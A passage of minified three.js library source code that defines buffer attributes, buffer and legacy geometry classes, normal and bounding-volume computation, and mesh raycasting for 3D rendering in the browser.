this.clippingPlanes=i,this.shadowSide=t.shadowSide,this},dispose:function(){this.dispatchEvent({type:"dispose"})}}),E.prototype=Object.create(T.prototype),E.prototype.constructor=E,E.prototype.isMeshBasicMaterial=!0,E.prototype.copy=function(t){return T.prototype.copy.call(this,t),this.color.copy(t.color),this.map=t.map,this.lightMap=t.lightMap,this.lightMapIntensity=t.lightMapIntensity,this.aoMap=t.aoMap,this.aoMapIntensity=t.aoMapIntensity,this.specularMap=t.specularMap,this.alphaMap=t.alphaMap,this.envMap=t.envMap,this.combine=t.combine,this.reflectivity=t.reflectivity,this.refractionRatio=t.refractionRatio,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.wireframeLinecap=t.wireframeLinecap,this.wireframeLinejoin=t.wireframeLinejoin,this.skinning=t.skinning,this.morphTargets=t.morphTargets,this},Object.defineProperty(C.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),Object.assign(C.prototype,{isBufferAttribute:!0,onUploadCallback:function(){},setArray:function(t){if(Array.isArray(t))throw new TypeError("THREE.BufferAttribute: array should be a Typed Array.");return this.count=void 0!==t?t.length/this.itemSize:0,this.array=t,this},setDynamic:function(t){return this.dynamic=t,this},copy:function(t){return this.name=t.name,this.array=new t.array.constructor(t.array),this.itemSize=t.itemSize,this.count=t.count,this.normalized=t.normalized,this.dynamic=t.dynamic,this},copyAt:function(t,e,i){t*=this.itemSize,i*=e.itemSize;for(var n=0,r=this.itemSize;n<r;n++)this.array[t+n]=e.array[i+n];return this},copyArray:function(t){return this.array.set(t),this},copyColorsArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(console.warn("THREE.BufferAttribute.copyColorsArray(): color is undefined",n),a=new b),e[i++]=a.r,e[i++]=a.g,e[i++]=a.b}return this},copyVector2sArray:function(t){for(var e=this.array,n=0,r=0,a=t.length;r<a;r++){var o=t[r];void 0===o&&(console.warn("THREE.BufferAttribute.copyVector2sArray(): vector is undefined",r),o=new i),e[n++]=o.x,e[n++]=o.y}return this},copyVector3sArray:function(t){for(var e=this.array,i=0,n=0,a=t.length;n<a;n++){var o=t[n];void 0===o&&(console.warn("THREE.BufferAttribute.copyVector3sArray(): vector is undefined",n),o=new r),e[i++]=o.x,e[i++]=o.y,e[i++]=o.z}return this},copyVector4sArray:function(t){for(var e=this.array,i=0,n=0,r=t.length;n<r;n++){var a=t[n];void 0===a&&(console.warn("THREE.BufferAttribute.copyVector4sArray(): vector is undefined",n),a=new s),e[i++]=a.x,e[i++]=a.y,e[i++]=a.z,e[i++]=a.w}return this},set:function(t,e){return void 0===e&&(e=0),this.array.set(t,e),this},getX:function(t){return this.array[t*this.itemSize]},setX:function(t,e){return this.array[t*this.itemSize]=e,this},getY:function(t){return this.array[t*this.itemSize+1]},setY:function(t,e){return this.array[t*this.itemSize+1]=e,this},getZ:function(t){return this.array[t*this.itemSize+2]},setZ:function(t,e){return this.array[t*this.itemSize+2]=e,this},getW:function(t){return this.array[t*this.itemSize+3]},setW:function(t,e){return this.array[t*this.itemSize+3]=e,this},setXY:function(t,e,i){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this},setXYZ:function(t,e,i,n){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this.array[t+2]=n,this},setXYZW:function(t,e,i,n,r){return t*=this.itemSize,this.array[t+0]=e,this.array[t+1]=i,this.array[t+2]=n,this.array[t+3]=r,this},onUpload:function(t){return this.onUploadCallback=t,this},clone:function(){return new this.constructor(this.array,this.itemSize).copy(this)},toJSON:function(){return{itemSize:this.itemSize,type:this.array.constructor.name,array:Array.prototype.slice.call(this.array),normalized:this.normalized}}}),A.prototype=Object.create(C.prototype),A.prototype.constructor=A,L.prototype=Object.create(C.prototype),L.prototype.constructor=L,P.prototype=Object.create(C.prototype),P.prototype.constructor=P,R.prototype=Object.create(C.prototype),R.prototype.constructor=R,O.prototype=Object.create(C.prototype),O.prototype.constructor=O,I.prototype=Object.create(C.prototype),I.prototype.constructor=I,z.prototype=Object.create(C.prototype),z.prototype.constructor=z,D.prototype=Object.create(C.prototype),D.prototype.constructor=D,N.prototype=Object.create(C.prototype),N.prototype.constructor=N,Object.assign(k.prototype,{computeGroups:function(t){var e=[],i=void 0;t=t.faces;for(var n=0;n<t.length;n++){var r=t[n];if(r.materialIndex!==i){i=r.materialIndex,void 0!==a&&(a.count=3*n-a.start,e.push(a));var a={start:3*n,materialIndex:i}}}void 0!==a&&(a.count=3*n-a.start,e.push(a)),this.groups=e},fromGeometry:function(t){var e=t.faces,n=t.vertices,r=t.faceVertexUvs,a=r[0]&&0<r[0].length,o=r[1]&&0<r[1].length,s=t.morphTargets,l=s.length;if(0<l){for(var c=[],h=0;h<l;h++)c[h]={name:s[h].name,data:[]};this.morphTargets.position=c}var u=t.morphNormals,d=u.length;if(0<d){var p=[];for(h=0;h<d;h++)p[h]={name:u[h].name,data:[]};this.morphTargets.normal=p}var f=t.skinIndices,m=t.skinWeights,g=f.length===n.length,v=m.length===n.length;for(0<n.length&&0===e.length&&console.error("THREE.DirectGeometry: Faceless geometries are not supported."),h=0;h<e.length;h++){var y=e[h];this.vertices.push(n[y.a],n[y.b],n[y.c]);var x=y.vertexNormals;for(3===x.length?this.normals.push(x[0],x[1],x[2]):(x=y.normal,this.normals.push(x,x,x)),3===(x=y.vertexColors).length?this.colors.push(x[0],x[1],x[2]):(x=y.color,this.colors.push(x,x,x)),!0===a&&(void 0!==(x=r[0][h])?this.uvs.push(x[0],x[1],x[2]):(console.warn("THREE.DirectGeometry.fromGeometry(): Undefined vertexUv ",h),this.uvs.push(new i,new i,new i))),!0===o&&(void 0!==(x=r[1][h])?this.uvs2.push(x[0],x[1],x[2]):(console.warn("THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 ",h),this.uvs2.push(new i,new i,new i))),x=0;x<l;x++){var b=s[x].vertices;c[x].data.push(b[y.a],b[y.b],b[y.c])}for(x=0;x<d;x++)b=u[x].vertexNormals[h],p[x].data.push(b.a,b.b,b.c);g&&this.skinIndices.push(f[y.a],f[y.b],f[y.c]),v&&this.skinWeights.push(m[y.a],m[y.b],m[y.c])}return this.computeGroups(t),this.verticesNeedUpdate=t.verticesNeedUpdate,this.normalsNeedUpdate=t.normalsNeedUpdate,this.colorsNeedUpdate=t.colorsNeedUpdate,this.uvsNeedUpdate=t.uvsNeedUpdate,this.groupsNeedUpdate=t.groupsNeedUpdate,null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone()),this}});var ko=1,Bo=new h,Fo=new p,Ho=new r,Go=new m,jo=new m,Uo=new r;F.prototype=Object.assign(Object.create(e.prototype),{constructor:F,isBufferGeometry:!0,getIndex:function(){return this.index},setIndex:function(t){Array.isArray(t)?this.index=new(65535<B(t)?z:O)(t,1):this.index=t},addAttribute:function(t,e,i){return e&&e.isBufferAttribute||e&&e.isInterleavedBufferAttribute?"index"===t?(console.warn("THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute."),this.setIndex(e),this):(this.attributes[t]=e,this):(console.warn("THREE.BufferGeometry: .addAttribute() now expects ( name, attribute )."),this.addAttribute(t,new C(e,i)))},getAttribute:function(t){return this.attributes[t]},removeAttribute:function(t){return delete this.attributes[t],this},addGroup:function(t,e,i){this.groups.push({start:t,count:e,materialIndex:void 0!==i?i:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(t,e){this.drawRange.start=t,this.drawRange.count=e},applyMatrix:function(t){var e=this.attributes.position;void 0!==e&&(t.applyToBufferAttribute(e),e.needsUpdate=!0);var i=this.attributes.normal;return void 0!==i&&((e=(new a).getNormalMatrix(t)).applyToBufferAttribute(i),i.needsUpdate=!0),void 0!==(i=this.attributes.tangent)&&((e=(new a).getNormalMatrix(t)).applyToBufferAttribute(i),i.needsUpdate=!0),null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this},rotateX:function(t){return Bo.makeRotationX(t),this.applyMatrix(Bo),this},rotateY:function(t){return Bo.makeRotationY(t),this.applyMatrix(Bo),this},rotateZ:function(t){return Bo.makeRotationZ(t),this.applyMatrix(Bo),this},translate:function(t,e,i){return Bo.makeTranslation(t,e,i),this.applyMatrix(Bo),this},scale:function(t,e,i){return Bo.makeScale(t,e,i),this.applyMatrix(Bo),this},lookAt:function(t){return Fo.lookAt(t),Fo.updateMatrix(),this.applyMatrix(Fo.matrix),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(Ho).negate(),this.translate(Ho.x,Ho.y,Ho.z),this},setFromObject:function(t){var e=t.geometry;if(t.isPoints||t.isLine){t=new D(3*e.vertices.length,3);var i=new D(3*e.colors.length,3);this.addAttribute("position",t.copyVector3sArray(e.vertices)),this.addAttribute("color",i.copyColorsArray(e.colors)),e.lineDistances&&e.lineDistances.length===e.vertices.length&&(t=new D(e.lineDistances.length,1),this.addAttribute("lineDistance",t.copyArray(e.lineDistances))),null!==e.boundingSphere&&(this.boundingSphere=e.boundingSphere.clone()),null!==e.boundingBox&&(this.boundingBox=e.boundingBox.clone())}else t.isMesh&&e&&e.isGeometry&&this.fromGeometry(e);return this},setFromPoints:function(t){for(var e=[],i=0,n=t.length;i<n;i++){var r=t[i];e.push(r.x,r.y,r.z||0)}return this.addAttribute("position",new D(e,3)),this},updateFromObject:function(t){var e=t.geometry;if(t.isMesh){var i=e.__directGeometry;if(!0===e.elementsNeedUpdate&&(i=void 0,e.elementsNeedUpdate=!1),void 0===i)return this.fromGeometry(e);i.verticesNeedUpdate=e.verticesNeedUpdate,i.normalsNeedUpdate=e.normalsNeedUpdate,i.colorsNeedUpdate=e.colorsNeedUpdate,i.uvsNeedUpdate=e.uvsNeedUpdate,i.groupsNeedUpdate=e.groupsNeedUpdate,e.verticesNeedUpdate=!1,e.normalsNeedUpdate=!1,e.colorsNeedUpdate=!1,e.uvsNeedUpdate=!1,e.groupsNeedUpdate=!1,e=i}return!0===e.verticesNeedUpdate&&(void 0!==(i=this.attributes.position)&&(i.copyVector3sArray(e.vertices),i.needsUpdate=!0),e.verticesNeedUpdate=!1),!0===e.normalsNeedUpdate&&(void 0!==(i=this.attributes.normal)&&(i.copyVector3sArray(e.normals),i.needsUpdate=!0),e.normalsNeedUpdate=!1),!0===e.colorsNeedUpdate&&(void 0!==(i=this.attributes.color)&&(i.copyColorsArray(e.colors),i.needsUpdate=!0),e.colorsNeedUpdate=!1),e.uvsNeedUpdate&&(void 0!==(i=this.attributes.uv)&&(i.copyVector2sArray(e.uvs),i.needsUpdate=!0),e.uvsNeedUpdate=!1),e.lineDistancesNeedUpdate&&(void 0!==(i=this.attributes.lineDistance)&&(i.copyArray(e.lineDistances),i.needsUpdate=!0),e.lineDistancesNeedUpdate=!1),e.groupsNeedUpdate&&(e.computeGroups(t.geometry),this.groups=e.groups,e.groupsNeedUpdate=!1),this},fromGeometry:function(t){return t.__directGeometry=(new k).fromGeometry(t),this.fromDirectGeometry(t.__directGeometry)},fromDirectGeometry:function(t){var e=new Float32Array(3*t.vertices.length);for(var i in this.addAttribute("position",new C(e,3).copyVector3sArray(t.vertices)),0<t.normals.length&&(e=new Float32Array(3*t.normals.length),this.addAttribute("normal",new C(e,3).copyVector3sArray(t.normals))),0<t.colors.length&&(e=new Float32Array(3*t.colors.length),this.addAttribute("color",new C(e,3).copyColorsArray(t.colors))),0<t.uvs.length&&(e=new Float32Array(2*t.uvs.length),this.addAttribute("uv",new C(e,2).copyVector2sArray(t.uvs))),0<t.uvs2.length&&(e=new Float32Array(2*t.uvs2.length),this.addAttribute("uv2",new C(e,2).copyVector2sArray(t.uvs2))),this.groups=t.groups,t.morphTargets){e=[];for(var n=t.morphTargets[i],r=0,a=n.length;r<a;r++){var o=n[r],s=new D(3*o.data.length,3);s.name=o.name,e.push(s.copyVector3sArray(o.data))}this.morphAttributes[i]=e}return 0<t.skinIndices.length&&(i=new D(4*t.skinIndices.length,4),this.addAttribute("skinIndex",i.copyVector4sArray(t.skinIndices))),0<t.skinWeights.length&&(i=new D(4*t.skinWeights.length,4),this.addAttribute("skinWeight",i.copyVector4sArray(t.skinWeights))),null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone()),this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new m);var t=this.attributes.position,e=this.morphAttributes.position;if(void 0!==t){if(this.boundingBox.setFromBufferAttribute(t),e){t=0;for(var i=e.length;t<i;t++)Go.setFromBufferAttribute(e[t]),this.boundingBox.expandByPoint(Go.min),this.boundingBox.expandByPoint(Go.max)}}else this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&console.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The "position" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new v);var t=this.attributes.position,e=this.morphAttributes.position;if(t){var i=this.boundingSphere.center;if(Go.setFromBufferAttribute(t),e)for(var n=0,r=e.length;n<r;n++){var a=e[n];jo.setFromBufferAttribute(a),Go.expandByPoint(jo.min),Go.expandByPoint(jo.max)}Go.getCenter(i);var o=0;for(n=0,r=t.count;n<r;n++)Uo.fromBufferAttribute(t,n),o=Math.max(o,i.distanceToSquared(Uo));if(e)for(n=0,r=e.length;n<r;n++){t=0;for(var s=(a=e[n]).count;t<s;t++)Uo.fromBufferAttribute(a,t),o=Math.max(o,i.distanceToSquared(Uo))}this.boundingSphere.radius=Math.sqrt(o),isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}},computeFaceNormals:function(){},computeVertexNormals:function(){var t=this.index,e=this.attributes;if(e.position){var i=e.position.array;if(void 0===e.normal)this.addAttribute("normal",new C(new Float32Array(i.length),3));else for(var n=e.normal.array,a=0,o=n.length;a<o;a++)n[a]=0;n=e.normal.array;var s=new r,l=new r,c=new r,h=new r,u=new r;if(t){var d=t.array;for(a=0,o=t.count;a<o;a+=3){t=3*d[a+0];var p=3*d[a+1],f=3*d[a+2];s.fromArray(i,t),l.fromArray(i,p),c.fromArray(i,f),h.subVectors(c,l),u.subVectors(s,l),h.cross(u),n[t]+=h.x,n[t+1]+=h.y,n[t+2]+=h.z,n[p]+=h.x,n[p+1]+=h.y,n[p+2]+=h.z,n[f]+=h.x,n[f+1]+=h.y,n[f+2]+=h.z}}else for(a=0,o=i.length;a<o;a+=9)s.fromArray(i,a),l.fromArray(i,a+3),c.fromArray(i,a+6),h.subVectors(c,l),u.subVectors(s,l),h.cross(u),n[a]=h.x,n[a+1]=h.y,n[a+2]=h.z,n[a+3]=h.x,n[a+4]=h.y,n[a+5]=h.z,n[a+6]=h.x,n[a+7]=h.y,n[a+8]=h.z;this.normalizeNormals(),e.normal.needsUpdate=!0}},merge:function(t,e){if(t&&t.isBufferGeometry){void 0===e&&(e=0,console.warn("THREE.BufferGeometry.merge(): Overwriting original geometry, starting at offset=0. Use BufferGeometryUtils.mergeBufferGeometries() for lossless merge."));var i,n=this.attributes;for(i in n)if(void 0!==t.attributes[i]){var r=n[i].array,a=t.attributes[i],o=a.array,s=a.itemSize*e;a=Math.min(o.length,r.length-s);for(var l=0;l<a;l++,s++)r[s]=o[l]}return this}console.error("THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.",t)},normalizeNormals:function(){for(var t=this.attributes.normal,e=0,i=t.count;e<i;e++)Uo.x=t.getX(e),Uo.y=t.getY(e),Uo.z=t.getZ(e),Uo.normalize(),t.setXYZ(e,Uo.x,Uo.y,Uo.z)},toNonIndexed:function(){function t(t,e){var i=t.array;t=t.itemSize;for(var n,r=new i.constructor(e.length*t),a=0,o=0,s=e.length;o<s;o++){n=e[o]*t;for(var l=0;l<t;l++)r[a++]=i[n++]}return new C(r,t)}if(null===this.index)return console.warn("THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed."),this;var e,i=new F,n=this.index.array,r=this.attributes;for(e in r){var a=r[e];a=t(a,n),i.addAttribute(e,a)}var o=this.morphAttributes;for(e in o){var s=[],l=o[e];r=0;for(var c=l.length;r<c;r++)a=t(a=l[r],n),s.push(a);i.morphAttributes[e]=s}for(r=0,e=(n=this.groups).length;r<e;r++)a=n[r],i.addGroup(a.start,a.count,a.materialIndex);return i},toJSON:function(){var t={metadata:{version:4.5,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(t.uuid=this.uuid,t.type=this.type,""!==this.name&&(t.name=this.name),0<Object.keys(this.userData).length&&(t.userData=this.userData),void 0!==this.parameters){var e=this.parameters;for(c in e)void 0!==e[c]&&(t[c]=e[c]);return t}t.data={attributes:{}},null!==(e=this.index)&&(t.data.index={type:e.array.constructor.name,array:Array.prototype.slice.call(e.array)});var i=this.attributes;for(c in i){var n=(e=i[c]).toJSON();""!==e.name&&(n.name=e.name),t.data.attributes[c]=n}i={};var r=!1;for(c in this.morphAttributes){for(var a=this.morphAttributes[c],o=[],s=0,l=a.length;s<l;s++)n=(e=a[s]).toJSON(),""!==e.name&&(n.name=e.name),o.push(n);0<o.length&&(i[c]=o,r=!0)}r&&(t.data.morphAttributes=i);var c=this.groups;return 0<c.length&&(t.data.groups=JSON.parse(JSON.stringify(c))),null!==(c=this.boundingSphere)&&(t.data.boundingSphere={center:c.center.toArray(),radius:c.radius}),t},clone:function(){return(new F).copy(this)},copy:function(t){var e;this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingSphere=this.boundingBox=null,this.name=t.name;var i=t.index;for(o in null!==i&&this.setIndex(i.clone()),i=t.attributes)this.addAttribute(o,i[o].clone());var n=t.morphAttributes;for(o in n){var r=[],a=n[o];for(i=0,e=a.length;i<e;i++)r.push(a[i].clone());this.morphAttributes[o]=r}var o=t.groups;for(i=0,e=o.length;i<e;i++)n=o[i],this.addGroup(n.start,n.count,n.materialIndex);return null!==(o=t.boundingBox)&&(this.boundingBox=o.clone()),null!==(o=t.boundingSphere)&&(this.boundingSphere=o.clone()),this.drawRange.start=t.drawRange.start,this.drawRange.count=t.drawRange.count,this.userData=t.userData,this},dispose:function(){this.dispatchEvent({type:"dispose"})}});var Vo=new h,Wo=new y,qo=new v,Xo=new r,Yo=new r,$o=new r,Zo=new r,Jo=new r,Ko=new r,Qo=new r,ts=new r,es=new r,is=new i,ns=new i,rs=new i,as=new r,os=new r;H.prototype=Object.assign(Object.create(p.prototype),{constructor:H,isMesh:!0,setDrawMode:function(t){this.drawMode=t},copy:function(t){return p.prototype.copy.call(this,t),this.drawMode=t.drawMode,void 0!==t.morphTargetInfluences&&(this.morphTargetInfluences=t.morphTargetInfluences.slice()),void 0!==t.morphTargetDictionary&&(this.morphTargetDictionary=Object.assign({},t.morphTargetDictionary)),this},updateMorphTargets:function(){var t=this.geometry;if(t.isBufferGeometry){t=t.morphAttributes;var e=Object.keys(t);if(0<e.length){var i=t[e[0]];if(void 0!==i)for(this.morphTargetInfluences=[],this.morphTargetDictionary={},t=0,e=i.length;t<e;t++){var n=i[t].name||String(t);this.morphTargetInfluences.push(0),this.morphTargetDictionary[n]=t}}}else void 0!==(t=t.morphTargets)&&0<t.length&&console.error("THREE.Mesh.updateMorphTargets() no longer supports THREE.Geometry. Use THREE.BufferGeometry instead.")},raycast:function(t,e){var n=this.geometry,r=this.material,a=this.matrixWorld;if(void 0!==r&&(null===n.boundingSphere&&n.computeBoundingSphere(),qo.copy(n.boundingSphere),qo.applyMatrix4(a),!1!==t.ray.intersectsSphere(qo)&&(Vo.getInverse(a),Wo.copy(t.ray).applyMatrix4(Vo),null===n.boundingBox||!1!==Wo.intersectsBox(n.boundingBox))))if(n.isBufferGeometry){var o=n.index;a=n.attributes.position;var s,l,c=n.morphAttributes.position,h=n.attributes.uv,u=n.attributes.uv2,d=n.groups,p=n.drawRange;if(null!==o)if(Array.isArray(r)){var f=0;for(s=d.length;f<s;f++){var m=d[f],g=r[m.materialIndex],v=Math.max(m.start,p.start);for(l=n=Math.min(m.start+m.count,p.start+p.count);v<l;v+=3){n=o.getX(v);var y=o.getX(v+1),b=o.getX(v+2);(n=j(this,g,t,Wo,a,c,h,u,n,y,b))&&(n.faceIndex=Math.floor(v/3),n.face.materialIndex=m.materialIndex,e.push(n))}}}else for(f=v=Math.max(0,p.start),s=n=Math.min(o.count,p.start+p.count);f<s;f+=3)n=o.getX(f),y=o.getX(f+1),b=o.getX(f+2),(n=j(this,r,t,Wo,a,c,h,u,n,y,b))&&(n.faceIndex=Math.floor(f/3),e.push(n));else if(void 0!==a)if(Array.isArray(r))for(f=0,s=d.length;f<s;f++)for(g=r[(m=d[f]).materialIndex],v=Math.max(m.start,p.start),l=n=Math.min(m.start+m.count,p.start+p.count);v<l;v+=3)(n=j(this,g,t,Wo,a,c,h,u,n=v,y=v+1,b=v+2))&&(n.faceIndex=Math.floor(v/3),n.face.materialIndex=m.materialIndex,e.push(n));else for(f=v=Math.max(0,p.start),s=n=Math.min(a.count,p.start+p.count);f<s;f+=3)(n=j(this,r,t,Wo,a,c,h,u,n=f,y=f+1,b=f+2))&&(n.faceIndex=Math.floor(f/3),e.push(n))}else if(n.isGeometry)for(a=Array.isArray(r),c=n.vertices,h=n.faces,0<(n=n.faceVertexUvs[0]).length&&(o=n),f=0,s=h.length;f<s;f++)m=h[f],void 0!==(n=a?r[m.materialIndex]:r)&&(u=c[m.a],d=c[m.b],p=c[m.c],n=G(this,n,t,Wo,u,d,p,as))&&(o&&o[f]&&(g=o[f],is.copy(g[0]),ns.copy(g[1]),rs.copy(g[2]),n.uv=x.getUV(as,u,d,p,is,ns,rs,new i)),n.face=m,n.faceIndex=f,e.push(n))},clone:function(){return new this.constructor(this.geometry,this.material).copy(this)}});var ss=0,ls=new h,cs=new p,hs=new r;U.prototype=Object.assign(Object.create(e.prototype),{constructor:U,isGeometry:!0,applyMatrix:function(t){for(var e=(new a).getNormalMatrix(t),i=0,n=this.vertices.length;i<n;i++)this.vertices[i].applyMatrix4(t);for(i=0,n=this.faces.length;i<n;i++){(t=this.faces[i]).normal.applyMatrix3(e).normalize();for(var r=0,o=t.vertexNormals.length;r<o;r++)t.vertexNormals[r].applyMatrix3(e).normalize()}return null!==this.boundingBox&&this.computeBoundingBox(),null!==this.boundingSphere&&this.computeBoundingSphere(),this.normalsNeedUpdate=this.verticesNeedUpdate=!0,this},rotateX:function(t){return ls.makeRotationX(t),this.applyMatrix(ls),this},rotateY:function(t){return ls.makeRotationY(t),this.applyMatrix(ls),this},rotateZ:function(t){return ls.makeRotationZ(t),this.applyMatrix(ls),this},translate:function(t,e,i){return ls.makeTranslation(t,e,i),this.applyMatrix(ls),this},scale:function(t,e,i){return ls.makeScale(t,e,i),this.applyMatrix(ls),this},lookAt:function(t){return cs.lookAt(t),cs.updateMatrix(),this.applyMatrix(cs.matrix),this},fromBufferGeometry:function(t){function e(t,e,a,o){var s=void 0===c?[]:[n.colors[t].clone(),n.colors[e].clone(),n.colors[a].clone()];o=new S(t,e,a,void 0===l?[]:[(new r).fromArray(l,3*t),(new r).fromArray(l,3*e),(new r).fromArray(l,3*a)],s,o),n.faces.push(o),void 0!==h&&n.faceVertexUvs[0].push([(new i).fromArray(h,2*t),(new i).fromArray(h,2*e),(new i).fromArray(h,2*a)]),void 0!==u&&n.faceVertexUvs[1].push([(new i).fromArray(u,2*t),(new i).fromArray(u,2*e),(new i).fromArray(u,2*a)])}var n=this,a=null!==t.index?t.index.array:void 0,o=t.attributes,s=o.position.array,l=void 0!==o.normal?o.normal.array:void 0,c=void 0!==o.color?o.color.array:void 0,h=void 0!==o.uv?o.uv.array:void 0,u=void 0!==o.uv2?o.uv2.array:void 0;for(void 0!==u&&(this.faceVertexUvs[1]=[]),o=0;o<s.length;o+=3)n.vertices.push((new r).fromArray(s,o)),void 0!==c&&n.colors.push((new b).fromArray(c,o));var d=t.groups;if(0<d.length)for(o=0;o<d.length;o++){var p=(s=d[o]).start,f=p;for(p+=s.count;f<p;f+=3)void 0!==a?e(a[f],a[f+1],a[f+2],s.materialIndex):e(f,f+1,f+2,s.materialIndex)}else if(void 0!==a)for(o=0;o<a.length;o+=3)e(a[o],a[o+1],a[o+2]);else for(o=0;o<s.length/3;o+=3)e(o,o+1,o+2);return this.computeFaceNormals(),null!==t.boundingBox&&(this.boundingBox=t.boundingBox.clone()),null!==t.boundingSphere&&(this.boundingSphere=t.boundingSphere.clone()),this},center:function(){return this.computeBoundingBox(),this.boundingBox.getCenter(hs).negate(),this.translate(hs.x,hs.y,hs.z),this},normalize:function(){this.computeBoundingSphere();var t=this.boundingSphere.center,e=this.boundingSphere.radius;e=0===e?1:1/e;var i=new h;return i.set(e,0,0,-e*t.x,0,e,0,-e*t.y,0,0,e,-e*t.z,0,0,0,1),this.applyMatrix(i),this},computeFaceNormals:function(){for(var t=new r,e=new r,i=0,n=this.faces.length;i<n;i++){var a=this.faces[i],o=this.vertices[a.a],s=this.vertices[a.b];t.subVectors(this.vertices[a.c],s),e.subVectors(o,s),t.cross(e),t.normalize(),a.normal.copy(t)}},computeVertexNormals:function(t){var e;void 0===t&&(t=!0);var i=Array(this.vertices.length),n=0;for(e=this.vertices.length;n<e;n++)i[n]=new r;if(t){var a=new r,o=new r;for(t=0,n=this.faces.length;t<n;t++){e=this.faces[t];var s=this.vertices[e.a],l=this.vertices[e.b],c=this.vertices[e.c];a.subVectors(c,l),o.subVectors(s,l),a.cross(o),i[e.a].add(a),i[e.b].add(a),i[e.c].add(a)}}else for(this.computeFaceNormals(),t=0,n=this.faces.length;t<n;t++)i[(e=this.faces[t]).a].add(e.normal),i[e.b].add(e.normal),i[e.c].add(e.normal);for(n=0,e=this.vertices.length;n<e;n++)i[n].normalize();for(t=0,n=this.faces.length;t<n;t++)3===(s=(e=this.faces[t]).vertexNormals).length?(s[0].copy(i[e.a]),s[1].copy(i[e.b]),s[2].copy(i[e.c])):(s[0]=i[e.a].clone(),s[1]=i[e.b].clone(),s[2]=i[e.c].clone());0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeFlatVertexNormals:function(){var t;this.computeFaceNormals();var e=0;for(t=this.faces.length;e<t;e++){var i=this.faces[e],n=i.vertexNormals;3===n.length?(n[0].copy(i.normal),n[1].copy(i.normal),n[2].copy(i.normal)):(n[0]=i.normal.clone(),n[1]=i.normal.clone(),n[2]=i.normal.clone())}0<this.faces.length&&(this.normalsNeedUpdate=!0)},computeMorphNormals:function(){var t,e,i=0;for(e=this.faces.length;i<e;i++){var n=this.faces[i];n.__originalFaceNormal?n.__originalFaceNormal.copy(n.normal):n.__originalFaceNormal=n.normal.clone(),n.__originalVertexNormals||(n.__originalVertexNormals=[]);var a=0;for(t=n.vertexNormals.length;a<t;a++)n.__originalVertexNormals[a]?n.__originalVertexNormals[a].copy(n.vertexNormals[a]):n.__originalVertexNormals[a]=n.vertexNormals[a].clone()}var o=new U;for(o.faces=this.faces,a=0,t=this.morphTargets.length;a<t;a++){if(!this.morphNormals[a]){this.morphNormals[a]={},this.morphNormals[a].faceNormals=[],this.morphNormals[a].vertexNormals=[],n=this.morphNormals[a].faceNormals;var s=this.morphNormals[a].vertexNormals;for(i=0,e=this.faces.length;i<e;i++){var l=new r,c={a:new r,b:new r,c:new r};n.push(l),s.push(c)}}for(s=this.morphNormals[a],o.vertices=this.morphTargets[a].vertices,o.computeFaceNormals(),o.computeVertexNormals(),i=0,e=this.faces.length;i<e;i++)n=this.faces[i],l=s.faceNormals[i],c=s.vertexNormals[i],l.copy(n.normal),c.a.copy(n.vertexNormals[0]),c.b.copy(n.vertexNormals[1]),c.c.copy(n.vertexNormals[2])}for(i=0,e=this.faces.length;i<e;i++)(n=this.faces[i]).normal=n.__originalFaceNormal,n.vertexNormals=n.__originalVertexNormals},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new m),this.boundingBox.setFromPoints(this.vertices)},computeBoundingSphere:function(){null===this.boundingSphere&&(this.boundingSphere=new v),this.boundingSphere.setFromPoints(this.vertices)},merge:function(t,e,i){if(t&&t.isGeometry){var n,r=this.vertices.length,o=this.vertices,s=t.vertices,l=this.faces,c=t.faces,h=this.colors,u=t.colors;void 0===i&&(i=0),void 0!==e&&(n=(new a).getNormalMatrix(e));for(var d=0,p=s.length;d<p;d++){var f=s[d].clone();void 0!==e&&f.applyMatrix4(e),o.push(f)}for(d=0,p=u.length;d<p;d++)h.push(u[d].clone());for(d=0,p=c.length;d<p;d++){var m=(s=c[d]).vertexNormals;for(u=s.vertexColors,(h=new S(s.a+r,s.b+r,s.c+r)).normal.copy(s.normal),void 0!==n&&h.normal.applyMatrix3(n).normalize(),e=0,o=m.length;e<o;e++)f=m[e].clone(),void 0!==n&&f.applyMatrix3(n).normalize(),h.vertexNormals.push(f);for(h.color.copy(s.color),e=0,o=u.length;e<o;e++)f=u[e],h.vertexColors.push(f.clone());h.materialIndex=s.materialIndex+i,l.push(h)}for(d=0,p=t.faceVertexUvs.length;d<p;d++)for(i=t.faceVertexUvs[d],void 0===this.faceVertexUvs[d]&&(this.faceVertexUvs[d]=[]),e=0,o=i.length;e<o;e++){for(r=[],l=0,c=(n=i[e]).length;l<c;l++)r.push(n[l].clone());this.faceVertexUvs[d].push(r)}}else console.error("THREE.Geometry.merge(): geometry not an instance of THREE.Geometry.",t)},mergeMesh:function(t){t&&t.isMesh?(t.matrixAutoUpdate&&t.updateMatrix(),this.merge(t.geometry,t.matrix)):console.error("THREE.Geometry.mergeMesh(): mesh not an instance of 